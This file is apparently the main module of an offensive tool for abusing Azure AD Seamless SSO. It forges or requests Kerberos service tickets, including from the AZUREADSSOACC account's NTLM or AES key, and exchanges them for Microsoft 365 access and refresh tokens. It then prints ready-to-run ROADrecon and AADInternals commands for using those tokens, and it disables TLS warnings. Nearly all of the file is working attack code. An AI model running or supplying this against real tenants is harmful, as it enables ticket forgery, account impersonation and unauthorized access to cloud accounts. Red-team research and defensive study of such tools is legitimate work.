import base64 
import sys
import requests
import json

from colorama import Fore

from .utils.log import logger
from .utils.helper import Helper
from .utils.exceptions import UsageError
from .utils.kerberos import KerberosHelper
from .utils.microsoft365 import Microsoft365Helper

#Disable SSL Warnings
from urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)


def run(options):
    show_colors = not options.no_color

    # check for required options
    required_options = ['tenant']

    if not options.tgt and not options.tgs: 
    # if not tickets are provided, we expect AZUREADSSOACC creds or user login credentials to acquire service ticket
        if options.adssoacc_ntlm or options.adssoacc_aes:
            if not ((options.domain_sid and options.user_rid is not None) or options.user_sid):
                raise UsageError("Full user SID (-user-sid) or domain SID (-domain-sid) and user relative ID (-user-rid) are required to forge the TGS")
            options.domain = options.domain if options.domain else 'dummy.lab'
            options.username = options.username if options.username else 'dummy_user'

        else:
            required_options.extend(['dc_host', 'domain','username']) 

            auth_options = ['password','ntlm','aes_key']
            provided_auth = [opt for opt in required_options if getattr(options, opt, None)]
            if not provided_auth:
                raise UsageError(f"Missing authentication parameters. Expecting TGT, TGS or login credentials")


    if options.tgt and not options.tgs:
        required_options.extend(['dc_host','domain']) 


    missing_options = [opt for opt in required_options if not getattr(options, opt, None)]
    if missing_options:
        raise UsageError(f"Missing required params: {', '.join(missing_options)}")

    
    # Instantiating Microsoft 365 Helper class
    m365_helper = Microsoft365Helper.from_options(options)

    
    # Checking if Seamless SSO is enabled
    if options.ignore_sso_check:
        logger.debug('Skipping Seamless SSO check')
        is_sso_enabled = True
    else:
        logger.debug('Checking if Seamless SSO is enabled')
        is_sso_enabled = m365_helper.check_seamless_sso()

        if is_sso_enabled:
            logger.info(f'Seamless SSO is enabled for {options.tenant}')

    if not is_sso_enabled:
        logger.info(f'The provided tenant does not support Seamless SSO Login. Use --ignore-sso-check to proceed anyways')
        sys.exit(1)


    # Instantiating Kerberos helper class
    krb_authenticator = KerberosHelper.from_options(options)

    # Try to aquire a TGS to authenticate to the cloud
    TGS = krb_authenticator.get_TGS()

    if TGS is not None:

        # Preparing SPNEGO token
        spnego_token = KerberosHelper.tgs_to_spnego(TGS)
        kerberos_ticket = base64.b64encode(spnego_token).decode()
        
        # Trying to authenticate using the ticket
        token = m365_helper.get_access_token_with_kerberos_ticket(kerberos_ticket)
        
        if token:
            #Process and present access tokens received 
            Helper.pretty_print(token, colored=show_colors, indent=2)


            # Preparing a ready-to-use ROADRecon/AADInternals commands
            access_token = token.get('access_token',None)
            refresh_token = token.get('refresh_token',None)

            if access_token and refresh_token:
                # Decoding the access token to get tenant ID
                encoded_payload = access_token.split('.')[1]
                encoded_payload += '=' * (len(encoded_payload) % 4)
                decoded_access_token = base64.urlsafe_b64decode(encoded_payload.encode('utf-8')).decode('utf-8')
                decoded_access_token = json.loads(decoded_access_token)
                
                print('\n')
                
                logger.info(f'You can import the token to ROADTools/AADInternals using the following command. Happy Hunting! :) ')
                
                # Preparing ROADRecon and AADInternals args and command
                roadrecon_args = {
                    "-t" : decoded_access_token.get("tid",""),
                    "--refresh-token" : refresh_token
                 }

                print(f'roadrecon {Helper.maybe_add_color("auth", Fore.YELLOW, show_colors)} {Helper.colorize_args(roadrecon_args, show_colors)}')

                print("\n")

                aadinternals_args = {
                    "-ClientId" : f'"{m365_helper.client_id}"',
                    "-Resource" : f'"{m365_helper.resource}"',
                    "-TenantId" : f'"{decoded_access_token.get("tid","")}"',
                    "-RefreshToken" : f'"{refresh_token}"',
                    "-SaveToCache" : "$True"

                }

                print(f'Get-AADIntAccessTokenWithRefreshToken {Helper.colorize_args(aadinternals_args, show_colors)}')